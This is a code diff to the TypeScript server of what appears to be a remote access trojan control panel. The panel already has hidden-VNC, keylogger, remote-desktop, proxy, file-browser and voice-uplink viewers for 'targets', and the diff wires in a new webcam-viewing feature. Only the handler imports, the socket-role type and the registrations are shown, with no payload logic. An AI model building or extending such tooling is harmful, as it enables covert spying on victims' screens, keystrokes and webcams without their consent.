@@ -72,6 +72,9 @@ import {
   handleConsoleViewerOpen,
   handleHVNCViewerMessage,
   handleHVNCViewerOpen,
+  handleWebcamViewerMessage,
+  handleWebcamViewerOpen,
+  handleWebcamDevices,
   handleRemoteDesktopViewerMessage,
   handleRemoteDesktopViewerOpen,
   hvncStreamingState,
@@ -79,6 +82,7 @@ import {
   notifyRdInputLatency,
   notifyRemoteDesktopStatus,
   rdStreamingState,
+  webcamStreamingState,
   sendDesktopCommand,
   sendHVNCCommand,
   stopConsoleOnTarget,
@@ -238,7 +242,7 @@ const notificationPluginHandlers = createNotificationPluginHandlers({
   savePluginState,
 });
 
-type SocketRole = ClientRole | "console_viewer" | "rd_viewer" | "hvnc_viewer" | "file_browser_viewer" | "process_viewer" | "keylogger_viewer" | "proxy_viewer" | "notifications_viewer";
+type SocketRole = ClientRole | "console_viewer" | "rd_viewer" | "webcam_viewer" | "hvnc_viewer" | "file_browser_viewer" | "process_viewer" | "keylogger_viewer" | "proxy_viewer" | "notifications_viewer";
 
 type PendingScript = {
   resolve: (result: any) => void;
@@ -358,9 +362,11 @@ async function startServer() {
     pendingCommandReplies,
     rdStreamingState,
     hvncStreamingState,
+    webcamStreamingState,
     getNotificationConfig,
     handleConsoleViewerOpen,
     handleRemoteDesktopViewerOpen,
+    handleWebcamViewerOpen,
     handleHVNCViewerOpen,
     handleFileBrowserViewerOpen,
     handleProcessViewerOpen,
@@ -370,6 +376,7 @@ async function startServer() {
     handleNotificationViewerOpen: notificationPluginHandlers.handleNotificationViewerOpen,
     handleConsoleViewerMessage,
     handleRemoteDesktopViewerMessage,
+    handleWebcamViewerMessage,
     handleHVNCViewerMessage,
     handleFileBrowserViewerMessage,
     handleProcessViewerMessage,
@@ -395,6 +402,7 @@ async function startServer() {
     handlePluginEvent: notificationPluginHandlers.handlePluginEvent,
     handleNotification: notificationPluginHandlers.handleNotification,
     handleVoiceUplink,
+    handleWebcamDevices,
     cleanupVoiceViewer,
     stopConsoleOnTarget,
     sendDesktopCommand,
